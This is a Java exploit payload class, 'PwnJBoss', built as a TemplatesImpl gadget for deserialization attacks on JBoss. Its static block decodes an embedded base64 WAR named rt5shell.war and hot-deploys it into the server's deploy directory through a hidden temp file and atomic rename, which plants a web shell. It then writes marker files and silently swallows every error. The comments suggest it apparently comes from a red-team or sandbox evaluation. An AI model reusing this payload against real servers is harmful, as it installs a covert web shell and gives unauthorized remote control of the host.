import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;

/**
 * RT5 JBoss weapon (in-process, zero exec): TemplatesImpl static block.
 * 1) drop rt5shell.war (base64-embedded) into server/default/deploy via
 *    hidden temp name + atomic rename (avoids HDScanner picking partial file)
 * 2) in-process app-tree marker write (criterion c, new mechanism for JBoss)
 * 3) /tmp write control (expect kernel DENY)
 */
public class PwnJBoss extends AbstractTranslet {

    static {
        // 1) WAR hot-deploy
        try {
            String b64 = "__WAR_B64__";
            byte[] war = javax.xml.bind.DatatypeConverter.parseBase64Binary(b64);
            java.io.File tmp = new java.io.File(
                "/jboss-6.1.0.Final/server/default/deploy/.rt5shell.war.tmp");
            java.io.FileOutputStream fo = new java.io.FileOutputStream(tmp);
            fo.write(war);
            fo.close();
            tmp.renameTo(new java.io.File(
                "/jboss-6.1.0.Final/server/default/deploy/rt5shell.war"));
        } catch (Throwable t1) {
            // silent
        }
        // 2) in-process app-tree marker
        try {
            java.io.FileOutputStream m = new java.io.FileOutputStream(
                "/jboss-6.1.0.Final/rt5_cc3_marker");
            m.write(("rt5_cc3_ok " + Long.toString(System.currentTimeMillis()))
                    .getBytes("UTF-8"));
            m.close();
        } catch (Throwable t2) {
            // silent
        }
        // 3) /tmp control (expect denied)
        try {
            java.io.FileOutputStream t = new java.io.FileOutputStream("/tmp/rt5_cc3_tmp");
            t.write(120);
            t.close();
        } catch (Throwable t3) {
            // silent
        }
    }

    public PwnJBoss() {
    }

    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM d,
                          com.sun.org.apache.xml.internal.serializer.SerializationHandler[] h) {
    }

    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM d,
                          com.sun.org.apache.xml.internal.dtm.DTMAxisIterator i,
                          com.sun.org.apache.xml.internal.serializer.SerializationHandler h) {
    }
}
